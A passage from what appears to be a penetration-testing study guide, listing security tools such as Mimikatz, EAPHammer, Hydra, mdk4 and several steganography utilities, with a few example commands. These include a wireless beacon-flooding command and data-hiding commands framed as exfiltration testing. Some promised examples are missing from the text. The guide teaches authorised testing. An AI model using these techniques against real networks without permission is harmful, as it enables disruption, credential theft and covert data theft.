Cloud Custodian (https://cloudcustodian.io/docs/index.html) runs a series of scripts that are designed to audit the security of cloud environments. It uses YAML files with policies to define what it looks for and produces reports of likely issues found with permissions and other cloud configurations based on the policy used to run it. It runs from the command line using a mode to control its behavior. For instance, it can scan, do nothing but validate the YAML, or can attempt to remediate the target. For cloud environments with well-documented assumptions, this can identify low-hanging fruit or make recommendations across many cloud assets quickly. Examples of Cloud Custodian are documented in Chapter 6.

CloudBrute

CloudBrute (https://github.com/0xsha/CloudBrute) is an enumeration tool for cloud environments. It supports multiple cloud providers and can identify buckets, applications, and storage based on domain information or other target keys supplied at runtime from an unauthenticated perspective. It can also help enumerate exposed ports and HTTP/S services based on what it finds. It is designed to run from the command line, using option flags to modify its behavior. Examples of its usage can be found in Chapter 6.

Coagula

Coagula (https://www.abc.se/~re/Coagula/Coagula.html) takes images and turns them into sounds. This can be used as part of steganography to conceal data within sound files. This may be a useful mechanism for data exfiltration to bypass data loss prevention tools or other security controls designed to trigger based on malicious content. Files can be reassembled from the sound file using a tool such as Audacity, Spek, or Sonic Visualiser.

Covenant

Covenant (https://github.com/cobbr/Covenant) is a .NET C2 framework designed to allow pentesters to collaborate during an attack operation. The tool uses a web interface for orchestration of the components, including configuration of listeners, payload generation, and management of agents on compromised hosts called Grunts.

CrackMapExec

CrackMapExec (CME) (https://github.com/byt3bl33d3r/CrackMapExec) is a post-exploitation tool designed to stealthily automate security testing of Active Directory environments. It uses native tools to "live off the land" as part of its tactic to remain undetected and evade security controls that would otherwise block attack tools. It also uses Impacket and PowerSploit to assess privilege issues and perform attack actions. This tool is worth additional independent exploration, although the documentation in the URL provided will get you started.

DirBuster

DirBuster (https://wiki.owasp.org/index.php/Category:OWASP\_DirBuster\_Project) is a Java application that uses dictionaries and wordlists to attempt to guess directories and filenames on websites. For sites or files that are not shown in site indexes or otherwise linked from sites you have crawled, these files can't be automatically discovered and must be brute-forced. DirBuster is now an inactive project that has been integrated into OWASP ZAP, but you can read more about its ideal use cases at OWASP: https://owasp.org/www-community/attacks/Brute\_force\_attack

Drozer

Drozer (https://github.com/FSecureLABS/drozer and https://labs.f-secure.com/tools/drozer/) is an Android security assessment framework, which acts as a third-party application that interacts with IPC endpoints for other applications and the underlying OS. This allows you to search for security vulnerabilities by interacting with the target via provided modules. Additional functionality is explored in Chapter 7.

EAPHammer

EAPHammer (https://github.com/s0lst1c3/eaphammer) is a pentesting tool designed for gaining access to wireless networks using evil twin attacks against WPA and WPA2 networks and networks using RADIUS. This tool can be installed in Kali Linux and is useful when you need to steal RADIUS credentials with a malicious AP or AD credentials with a hostile portal. It also supports karma attacks.

Empire

Empire (https://www.powershellempire.com/ and https://github.com/BC-SECURITY/Empire) is a PowerShell exploitation framework that is no longer supported by its original authors. However, since many of the tools do still work, they are sometimes referenced by pentest blogs and are still used in practice. These tools have become well-known and are therefore more likely to be detected in advanced environments unless additional methods of concealment (such as using PowerPick or obfuscation techniques) are also applied. The framework includes many PowerShell scripts and modules designed for gathering credentials (running Mimikatz), discovery and reconnaissance, privilege escalation, lateral movement, and persistence, among others. Some examples of Empire components are discussed in Chapter 9.

Ettercap

Ettercap (https://www.ettercap-project.org/) is an on-path tool for network traffic. It can perform ARP spoofing attacks, sniff network traffic over a live connection, and apply filters to modify that traffic in real time. It is a command-line tool that supports being run in Linux, BSD, and some versions of macOS. Ettercap is useful if you have access to a network but need to intercept or modify traffic between other network endpoints on the same subnet in order to further your access. Examples might be if you needed to attempt to steal credentials or hijack web traffic.

Exploit Database

Exploit Database (https://www.exploit-db.com/) is a database of known exploits contributed by the community that you can search to find proofs of concept and exploit examples for use during a pentest. Exploits may need to be additionally modified in order to be useful within the context of a specific penetration test.

Fern

Fern (http://www.fern-pro.com/ and https://github.com/savio-code/fern-wifi-cracker) is a Python tool for Wi-Fi security auditing and cracking. It can recover WEP, WPA, and WPS keys, as well as perform several types of Wi-Fi attacks (Reaver, chopchop, fragmentation attacks, and more). It comes in a free version (GitHub) and a paid professional version. It requires the aircrack-ng suite, Scapy, and Reaver.

FOCA

FOCA (Fingerprinting Organizations with Collected Archives) (https://github.com/ElevenPaths/FOCA) is a tool to mine documents for metadata and other hidden information. This information may be useful in the context of reconnaissance and discovery in preparation for social engineering attacks. For example, this can help extract author information, e-mail addresses, or even account information for the generation of pretexts and creating targeting lists.

Frida

Frida (https://frida.re/) is a mobile testing toolkit that allows pentesters to inject scripts into black box processes and gain insight into the operations of APIs, private code, and running functions during security testing of mobile devices. Frida and its use cases are discussed in further depth in Chapter 7.

GDB

The GNU Debugger (https://www.gnu.org/software/gdb/) is a free debugger. Debuggers allow you to interact with applications as they run in order to analyze their behavior by doing things like pausing execution at specific breakpoints and analyzing what has happened during a failure or change in execution. Debuggers do not disassemble code from the compiled format to source code, but they can allow insight into how the code runs based on changes to execution they inject during runtime. These are useful for vulnerability research, reverse engineering, and exploit development. One example would be if you are trying to bypass authentication in an application by changing the value sent from an authentication function to the rest of the program manually in a debugger.

Gobuster

Gobuster (https://github.com/OJ/gobuster) can be used to enumerate Amazon S3 buckets; virtual hostnames for web servers; and DNS entries using fuzzing, filters, and different protocols and HTTP methods. The tool is designed to run at the command line, with flags to modify its behavior at runtime. The tool observes four modes: dir (for directory bruting), dns (for DNS hostname enumeration), s3 (for AWS buckets), and vhost (for web servers). At runtime, you specify a wordlist and output file location, as well as necessary information for targeting.

Hashcat

Hashcat (https://hashcat.net/hashcat/) is a GPU-based cracking engine designed for brute-force and dictionary attacks using rules and filters. It's designed to target password hashes of various kinds, and it is considered to be the fastest method for password cracking. Use this when you have a hash that you cannot pass, or if you need to audit password strength based on a collection of hashes.

Hping

Hping (http://www.hping.org/) is a command-line tool for generating TCP/IP packets. While its functionality has been implemented in Nmap, hping3 is scriptable in the Tcl scripting language, and it can render packets into strings-based, human-readable descriptions for ease of writing scripts to perform low-level packet manipulation and analysis. With Hping, you can also spoof the source IP address and generate large amounts of traffic in order to explore various DDoS techniques, the most common use case during pentesting.

Hydra

Hydra (https://github.com/vanhauser-thc/thc-hydra) is a tool for password spraying and brute-forcing against live services, including HTTP, Oracle, Cisco, POP3, VNC, and more. Its highly parallelized approach to attacking live services across multiple protocols, as opposed to offline password cracking, makes it very useful for pentesters to evaluate password security and effective attack detection and mitigation during purple team exercises. It is typically used as a command-line tool that will run in various operating systems, using -flags to modify its behavior. Example usage is described in Chapter 5.

IDA

IDA (https://hex-rays.com/ida-pro/) comes in various paid versions and a free version (IDA Free). The features that are available differ across versions, but it is a powerful code disassembly and debugging tool. It analyzes a compiled application and examines how the CPU processes the information and attempts to generate assembly code from that analysis, and it can support remote debugging for various types of fuzzing attacks. It has a variety of plugins (e.g., HexRays) that allow you to extract C code from a compiled binary for static code analysis. It is useful for code analysis, reverse engineering, vulnerability research, and exploit development.

Immunity Debugger

Immunity Debugger (https://www.immunityinc.com/products/debugger/) is useful for exploit development, malware analysis, and reverse engineering. It allows you to graphically render functions and program flows, facilitates heap analysis, and implements a Python API for scriptability. The Mona Python plugin, for example, will allow you to easily figure out offsets for buffer overflows, identify ROP chains, and explore other gadgets that are useful for exploitation.

Impacket

Impacket (https://github.com/SecureAuthCorp/impacket) is a Python tool suite used for network protocol manipulation. There are many valid uses for Impacket during penetration tests, including interacting with Windows hosts from Linux attack platforms. One example might be to use an admin credential to DCsync a domain controller from a Linux box. Usage examples are discussed in Chapter 9.

John the Ripper

John the Ripper (JtR) (https://www.openwall.com/john/) is an offline password cracking tool. For CPU-based cracking, JtR is one of the fastest tools for password recovery. So, if GPU cracking is unavailable, you would use JtR. However, JtR also implements different rule sets than other cracking tools, and these rule sets may recover passwords where other cracking tools fail, so it is a good supplement to other cracking tools for large password lists.

Kismet

Kismet (https://www.kismetwireless.net/) is a wireless security assessment tool that can detect devices, sniff wireless traffic, and aid with wardriving. It supports Bluetooth as well as traditional wireless networks. It is most commonly used for wireless reconnaissance and supports graphical mapping of wireless data based on supplemental GPS data. Refer to Chapter 4 for more details about wireless attacks.

Maltego

Maltego (https://www.maltego.com/) uses transforms to automatically retrieve reconnaissance data from open-source and paid data sources based on search seeds, such as an e-mail address or domain name. This is a powerful reconnaissance tool that can quickly identify relationships between targets, such as e-mails, web servers, or other infrastructure (e.g., IP ranges) that are very useful in constructing and confirming target lists, building pretexts, and identifying other potentially interesting areas for research about your target.

mdk4

mdk4 (https://github.com/aircrack-ng/mdk4 and https://en.kali.tools/?p=864) is a wireless testing tool used to inject frames on several operating systems. This allows you to perform numerous attack types, including beacon flooding, denial of service and deauth attacks, SSID probe and brute-forcing, packet fuzzing, and more. An example of performing a beacon flooding attack on the wireless interface wlan0 using nonprintable characters and long SSIDs (-a) with valid MAC addresses according to the embedded OUI database (-m) at a rate of 200 packets per second (-s) might look like this:

$ sudo mdk4 wlan0 b -a -m -s 200

Medusa

Medusa (https://github.com/jmk-foofus/medusa and http://foofus.net/goons/jmk/medusa/medusa.html) is a tool similar to Hydra, in that it performs password brute-force attacks against live services. It supports multiple protocols and can send requests in parallel from wordlists. During a pentest, you would use Medusa in the same circumstances that you would use Hydra, with the choice being based on preference, performance in your environment, and protocol support.

Metasploit

Metasploit (https://www.metasploit.com/) is a pentesting framework that includes many community-contributed modules for attack. It is useful for most phases of penetration testing, including reconnaissance, vulnerability identification, exploitation, and command and control. Metasploit is discussed throughout the book, but mainly in the context of post-exploitation in Chapter 9.

Mimikatz

Mimikatz (https://github.com/gentilkiwi/mimikatz) is a tool used to extract authentication information from Windows systems. This includes Kerberos tickets, plaintext passwords, password hashes, PIN codes, and more. It can help pentesters perform pass-the-hash and pass-the-ticket attacks, as well as Kerberoasting attacks by building golden tickets. During a pentest you would use Mimikatz during post-exploitation, such as if you have access to a system and wanted to gather additional credentials for lateral movement or privilege escalation. This is discussed further in Chapter 9.

mitm6

mitm6 (https://github.com/dirkjanm/mitm6) intercepts DNS and DHCP queries from a selected target and operates as a rogue DNS/DHCP server. This can then be used to redirect victim traffic to other malicious resources or perform relay attacks when used with tools like ntlmrelayx in Impacket. Further information, including examples of usage and output, are available in the Fox-IT blog article "mitm6 – compromising IPv4 networks via IPv6," which can be found here: https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/

MobSF

The Mobile Security Framework (MobSF) (https://github.com/MobSF/Mobile-Security-Framework-MobSF) is a mobile pentesting framework that can target Android, iOS, and Windows devices. It provides tools for static and dynamic code analysis and is discussed further in Chapter 7.

Ncat

Ncat (https://nmap.org/ncat/) is an implementation of the Netcat (nc) tool for Nmap. It allows you to read and write data across networks using the command line. It can be used to redirect TCP and UDP ports to other sites, and it supports SSL and proxy implementations with SOCKS. Ncat is integrated into Nmap and is downloaded with it. The detailed usage guide with examples can be found on the Nmap site at https://nmap.org/ncat/guide/index.html.

Nessus

Nessus (https://www.tenable.com/products/nessus) is a vulnerability scanner. It can perform network discovery using port scans and enumerate services from either an authenticated or nonauthenticated context. From an unauthenticated context, it attempts to connect to exposed services and use banner and installation information or differences in protocol responses to attempt to identify listening services and versions. It can then compare that information to an extensive internal database of known vulnerabilities to highlight potential or confirmed vulnerabilities on the identified services. This is useful for identifying potential paths for exploitation and quickly performing mass discovery when stealth is not a concern during a pentest.

Netcat

Netcat (nc) (https://linux.die.net/man/1/nc) is a tool that is distributed with many Linux distributions that allows you to send and receive TCP and UDP traffic, listen on arbitrary TCP and UDP ports, and do many other tasks with TCP or UDP. It is highly scriptable using Bash, for example, and can be used during a pentest to transfer files to or from target machines, implement bind or reverse shells, or directly test a service using a raw connection. Examples of usage are included in Chapter 11.

Nikto

Nikto (https://cirt.net/Nikto2andhttps://github.com/sullo/nikto/wiki) is a web server vulnerability scanner. It tests for known vulnerabilities against target web URLs you provide. An example of using Nikto was given in Chapter 11, but you would use it to find known vulnerabilities pertaining to outdated plugin versions or other web software in cases where stealth is not a concern.

Nmap

Nmap (https://nmap.org/) is a free pentest tool for network discovery and security testing. It is typically run from the command line, but a GUI version (Zenmap) does exist. Nmap has a robust scripting engine and a sizable collection of scripts to perform various activities, including everything from brute force and enumeration to database hash dumping and form fuzzing. Nmap is referenced throughout this book.

nslookup

nslookup (https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/nslookup and https://linux.die.net/man/1/nslookup) is a utility that is included with multiple operating systems that allows you to make DNS queries to find hostnames from IP addresses and IP addresses from hostnames on a network. That is its most primitive use, however. Various command-line and usage modes make it useful for reconnaissance and troubleshooting of DNS. Check out Chapter 2 for more use cases involving information gathering and reconnaissance.

Objection

Objection (https://github.com/sensepost/objection and https://github.com/sensepost/objection/wiki/Using-objection) is a mobile exploitation toolkit that aids in runtime security testing without needing to jailbreak the device. By using a patched application to hook Objection calls, you can remotely interact with the device to explore security issues. Objection is discussed in more detail with usage examples in Chapter 7.

OllyDbg

OllyDbg (https://www.ollydbg.de/) is a free Windows-based debugger. It's useful in performing code analysis by tracing registers and recognizing strings, constants, API calls, procedures, and more. As many tools in the debugging space cost money, this is often an alternative for pentesters with limited budget or resources. Debugging is helpful for vulnerability identification, exploit development, and dynamic application analysis. Load an application into a debugger, and you can manipulate inputs and outputs for various functions during runtime by using execution breakpoints in order to identify flaws in application logic or other bugs.

Open VAS

Open Vulnerability Assessment Scanner (OpenVAS) (https://www.openvas.org/) is a free vulnerability scanner and an open-source alternative to Nessus. The library of vulnerabilities and tests that it uses are community contributed, and it may have different findings than other vulnerability scanners such as Nessus, but it provides a free and open-source alternative to other options for fast vulnerability identification and attack surface enumeration.

OpenStego

OpenStego (https://www.openstego.com/) is a steganography tool that can hide and recover hidden data from files. OpenStego takes a source file (e.g., what you are hiding) and an image where you would like to hide the file and supplies both values via a graphical user interface. OpenStego outputs an image file that appears visually to be the same as the original image, but it contains the full contents of the source file encoded within the image. This information can optionally be encrypted to prevent unauthorized recovery of the data. These types of tools are useful for data exfiltration and security control evasion.

OWASP ZAP

OWASP Zed Attack Proxy (ZAP) (https://www.zaproxy.org/docs/) is a free web application scanner. Its functional purpose is very similar to Burp Suite, but it offers a different array of features. ZAP does not offer as extensive a list of community contributed plugins as are available with Burp Suite, for example, and it does not offer an integrated browser for testing. However, it does allow many of the same attacks that Burp Suite does—for example, injection of web content, proxying of web content, crawling, and viewing requests and responses from web servers. However, with ZAP, vulnerability identification is more manual than with Burp Suite, which leverages a built-in vulnerability scanner.

Pacu

Pacu (https://rhinosecuritylabs.com/aws/pacu-open-source-aws-exploitation-framework/) is an AWS security testing toolkit created by Rhino Security Labs. It uses modules to perform various actions, including testing permissions, injecting backdoors via credentials, and conducting automated privilege escalation attacks. Pacu is discussed in Chapter 6.

Patator

Patator (https://github.com/lanjelot/patator) is a password brute-forcing tool that works against live listening services. Similar to Hydra and Medusa, it is another solution that uses modules to target specific protocols and can perform host and user enumeration, as well as password guessing attacks based on files containing guessable items, such as hostnames, usernames, and passwords.

ProxyChains

ProxyChains (https://github.com/haad/proxychains) allows you to tunnel other traffic besides web traffic over a proxy. This is useful during a pentest when you need to access systems on a network that is inaccessible to your attack platform but accessible to a target you have compromised. Essentially, this tool allows you to bridge networks by creating a proxy tunnel for any other protocol. It determines what ports and targets to use for the tunnel using a config file (default: proxychains.conf). You could use it to run Nmap by doing the following, for example:

$ proxychains nmap -A 10.20.0.0/24

The proxychains.conf will have an entry similar to this, which designates which system you are proxying through. So, assume that our attack host can't reach 10.20.0.6, but we can reach 10.10.0.6, and 10.10.0.6 can reach 10.20.0.6. The proxychains.conf file could specify this to make the earlier nmap command work.

Or, you could run a bash shell with SSH using SOCKS:

This command tells SSH to run in the background after it connects without executing anything remotely (-fN) and to dynamically forward port 8675 (-D).

Reaver

Reaver (https://github.com/t6x/reaver-wps-fork-t6x) is a Wi-Fi brute-forcing tool designed to attack WPS registrar PINs to get WPA/WPA2 passphrases and can perform the offline pixie dust attack. Examples are covered in Chapter 4.

Recon-ng

Recon-ng (https://github.com/lanmaster53/recon-ng and https://github.com/lanmaster53/recon-ng/wiki) is a framework for conducting reconnaissance. The tool implements a Metasploit-like shell from which you can run modules to perform reconnaissance. Modules can be downloaded from a marketplace from within the tool. It uses API keys for web systems such as VirusTotal, GitHub, Censys, or Shodan to gather OSINT as part of the passive information gathering process. This can help you find target hostnames, social media data from targeted users, leaked credentials, contact information, and more. Recon-ng usage examples are covered in more detail in Chapter 2.

Responder

Responder (https://github.com/lgandx/Responder) is a tool for responding to LLMNR, NBT-NS, and MDNS requests and intercepting the resulting data from that exchange. It can be used to gather Windows challenge hashes resulting from requests to nonexistent services or other maliciously redirected requests. The tool has multiple uses, but this is the primary use you will likely see on the exam.

Rogue Access Points

Wireless security testing tools may be able to act as a rogue AP. This can entice wireless supplicants to connect, enabling the tester to acquire credentials or other information from the victim systems. Wireless pentesting is covered in Chapter 4.

SCAP

Security Content Automation Protocol (SCAP) (https://csrc.nist.gov/projects/security-content-automation-protocol) is a collection of specifications for exchanging content from security automation. Specifications include resources for asset identification, asset reporting, NIST's Common Configuration Enumeration (CCE) and Common Platform Enumeration (CPE), Open Vulnerability Assessment Language (OVAL), Software Identification (SWID), and more. The idea is to provide content for configuration compliance checks and vulnerability identification that multiple tools can use in order to perform additional evaluation of security based on standards. This is most commonly referenced in environments requiring compliance according to U.S. government specifications.

ScoutSuite

ScoutSuite (https://github.com/nccgroup/ScoutSuite) is a multiplatform cloud security auditing tool. It runs automatic checks via a command-line interface and produces a report to highlight potential flaws in configurations of cloud environments or other issues that should be manually investigated. This can be used as an initial quick identification of areas to look for large-scale cloud assessments. Usage examples are in Chapter 6.

SearchSploit

SearchSploit (https://www.exploit-db.com/searchsploit) is a tool that is included with Kali Linux that can be used for searching exploit-db. This allows you to search for potential exploits based on identified target characteristics or specific vulnerabilities.

SET

The Social-Engineer Toolkit (SET) (https://github.com/trustedsec/social-engineer-toolkit and https://github.com/trustedsec/social-engineer-toolkit/raw/master/readme/User\_Manual.pdf) is an open-source Python toolkit for pentesting using social engineering. It has integrations with Ettercap, Metasploit, and other tools. Among other capabilities, SET can generate and host web-based payloads for social engineering attacks and create and send spoofed e-mails. An example of usage can be found in Chapter 8.

Shodan

Shodan's (https://www.shodan.io/) strength is aiding pentesters in gathering information about a target using passive techniques. Shodan scans Internet-facing assets and gathers information about open ports and identifiable services and allows you to search the results of those scans without touching the targets yourself.

Snow

Snow (http://manpages.ubuntu.com/manpages/bionic/man1/stegsnow.1.html) is a steganography tool that allows you to test security controls evasion by hiding data using the white space of ASCII messages. This is useful for data exfiltration testing. Since trailing white space characters are not typically visible to the human eye, Snow takes data to be hidden, a passphrase, a file in which to hide the data, and an output file to place the result. It can compress the data to hide it, or uncompress it if it is recovering it. Here is an example:

$ stegsnow -C -f hideme.txt -p "Super strong passphrase" innocent.txt hidden.txt

The output file will look identical to the original innocent.txt to the human eye.

Sonic Visualiser

Sonic Visualiser (https://www.sonicvisualiser.org/) has a graphical user interface and is designed to analyze the contents of audio files by showing the sound data graphically as waves or other patterns. It can be used to retrieve steganographic data from audio files hidden by tools like Coagula. A detailed writeup of one such use case can be found here: https://www.okiok.com/cyber-beats-nsec-2020-write-up/

Spooftooph

Spooftooph (https://gitlab.com/kalilinux/packages/spooftooph and https://www.kali.org/tools/spooftooph/) is a Bluetooth testing tool that is designed to spoof or clone a Bluetooth device name, class, and address. This tool can log Bluetooth information, generate new Bluetooth profiles with random data, change the profile dynamically based on a time interval, and choose a device to clone from a scan log. It can be used to scan for Bluetooth devices in a range, clone a device, and gather information sent to it.

SQLmap

SQLmap (https://sqlmap.org/) attempts to automatically identify and exploit SQL injection when supplied with a target URL. If you were performing a web application pentest and identified a potential SQL injection in a form using Burp Scanner, you could take the URL and give it to SQLmap. SQLmap would attempt to identify a working SQL injection string so that you could exploit the vulnerability and examine the impact or provide a proof of concept for exploitation during the pentest. Examples are given in Chapter 5.

SSH

Secure Shell (SSH) (https://www.openssh.com/) is an encrypted remote access protocol. It's often found natively in Linux systems, but may be installed in Windows. In addition to being able to be used for remote administration, SSH can be used to tunnel traffic across networks. This is discussed in Chapter 9.

Steghide

Steghide (http://steghide.sourceforge.net/) is a steganography program that can hide or retrieve data hidden inside image or audio files. The resulting file looks and sounds exactly like the original file from a human perspective. Data can be encrypted when hidden. An example of usage is:

$ steghide -cf myimage.jpg -ef secretfile.txt -sf newimage.jpg

This hides the file "secretfile.txt" (the embedded file) inside a new file called newimage.jpg (a stego file) that is based on the file myimage.jpg (a cover file). This will prompt for a passphrase at runtime. To recover the file, you would have to use the -xf flag to extract the data from the newimage.jpg file back into the secretfile.txt and supply the passphrase:

$ steghide -sf newimage.jpg -xf secretfile.txt

theHarvester

theHarvester (https://github.com/laramies/theHarvester) is a command-line tool that helps pentesters perform OSINT gathering about a target during the early phases of a pentest engagement. Examples of data gathered include e-mails, names, subdomains, IP addresses, and URLs. It can perform both passive and active information gathering, and it also can perform DNS brute-forcing. Examples of theHarvester usage are covered in Chapter 2.

TinEye

TinEye (https://tineye.com/) is a reverse image search tool. You can load or reference an image and then search for it online. You can do the same thing with Google Images search, but this is sometimes useful in finding an original image in order to identify whether it has been manipulated with a steganography tool. For example, you can compare the image found with TinEye to the copy you suspect has been manipulated with compare from the ImageMagick suite or something like XOR to attempt to derive the steganographic text.

truffleHog

truffleHog (https://github.com/trufflesecurity/truffleHog) searches GitHub repositories for secrets (such as SSH or API keys), examining commit history and branches for accidental leaks of important information. Searches can be limited by depth, target repository, and with regex filters. During a pentest, these can be useful for identifying potential leaks of credentials or keys to establish an initial access point for cloud or authentication service targets, for example.

w3af

w3af (https://github.com/andresriancho/w3af/ and http://w3af.org/) is a web application attack and audit framework designed to attempt to find and exploit vulnerabilities in web applications. Launching w3af at the command line will drop you into a w3af shell, where you can supply run parameters through context settings and execute scans. For example:

You can use this to check a single directory for vulnerabilities according to all or a set of audit plugins, crawl to identify other URLs, or even ignore specific forms or URLs by creating exclusions. W3af is useful for scanning REST APIs, identifying endpoints, and attempting to automatically identify and exploit vulnerabilities using various payloads.

Wapiti

Wapiti (https://wapiti.sourceforge.io/ and https://owasp.org/www-community/Automated\_Audit\_using\_WAPITI) is a command-line tool that fuzzes web applications during a black box penetration test and attempts to identify SQL injections, XSS, file disclosure vulnerabilities, XXE, CRLF, and more. It can also attempt brute-forcing of files, directories, and login forms. The shortest way to use it is:

$ wapiti -u http://targeturl/

An example of Wapiti scan results is available here: https://wapiti.sourceforge.io/example.txt

Whois

Whois (https://linux.die.net/man/1/whois) is a service for looking up domain registration information and is not only a tool included with Linux, as referenced here. The tool is the client for the service. The whois tool can be used to look up IP or hostname ownership information and can specify which whois server to use for the query. These concepts are addressed in Chapter 2.

Wifite2

Wifite (https://github.com/derv82/wifite2) is a Python script for attacking wireless networks. It can perform the offline pixie dust attacks and online PIN brute-forcing against WPS networks; capture WPA handshakes and PMKID hashes; and perform various WEP attacks, including fragmentation, chopchop, and replay attacks. It requires the aircrack-ng suite for wireless capture, relay, and cracking. Example videos are included within the GitHub repository.

WiGLE

WiGLE (https://wigle.net/) is a collection of public wardriving data that you can use to look up SSIDs and BSSIDs to find out where they are according to GPS information in the search database. This is good for passive information gathering in preparation for a wireless or physical pentest assessment, as you can also look at maps to identify the wireless networks that have been observed during previous wardriving exercises, as reported by the community.

WinDbg

WinDbg (https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/debugger-download-tools) is a Windows-based debugging program. It has similar use cases to other debuggers such as OllyDbg and Immunity Debugger, although each has a different interface and output. For pentesting, it is sometimes preferred for Windows kernel debugging because of its kernel hooking capabilities.

Wireshark

Wireshark (https://www.wireshark.org/) is a graphical network traffic analyzer. It can be used against packet captures across many kinds of networks and enables deep protocol inspection, the ability to perform live packet captures, and analyze PCAPs from other sources. This tool has many uses during a pentest, including the ability to extract files from captured network streams, extract conversations from VoIP traffic, deconstruct decrypted communications, and analyze network communications for insecurely transmitted sensitive data. However, capturing data requires access to the network in question. This is often first accomplished with some form of on-path attack or access to one party of the network communication. Otherwise, only broadcast traffic may be visible.

WPScan

WPScan is a web application security scanner that focuses on WordPress installations. It attempts to identify insecure WordPress configurations and plugins based on versioning data, username enumeration, known default passwords, exposed files, and a database of known vulnerabilities. The tool requires a license to be used commercially.
